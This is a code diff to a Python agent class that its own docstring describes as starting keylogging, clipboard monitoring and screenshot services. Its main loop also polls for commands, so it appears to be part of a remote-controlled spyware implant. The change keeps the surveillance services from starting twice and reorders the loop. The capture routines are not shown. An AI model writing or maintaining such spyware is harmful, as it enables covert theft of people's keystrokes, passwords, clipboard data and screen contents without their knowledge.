@@ -18,11 +18,15 @@ class Agent:
         Initialize the agent with its unique ID.
         """
         self.agent_id = agent_id
+        self._services_started = False
 
     def services(self):
         """
         Start background services for keylogging, clipboard monitoring, and screenshots.
         """
+        if self._services_started:
+            return
+
         SYSTEM = platform.system()
 
         if SYSTEM in ["Windows", "Darwin"]:
@@ -30,6 +34,7 @@ class Agent:
             start_clipboard_service(self.agent_id)
 
         start_screenshot_service(self.agent_id)
+        self._services_started = True
 
     def metrics(self):
         """
@@ -71,8 +76,8 @@ class Agent:
         """
         while not (stop_event and stop_event.is_set()):
             try:
-                self.metrics()
                 self.services()
+                self.metrics()
                 self.check_commands()
             except Exception as e:
                 logger.error(f"Main loop error: {e}")
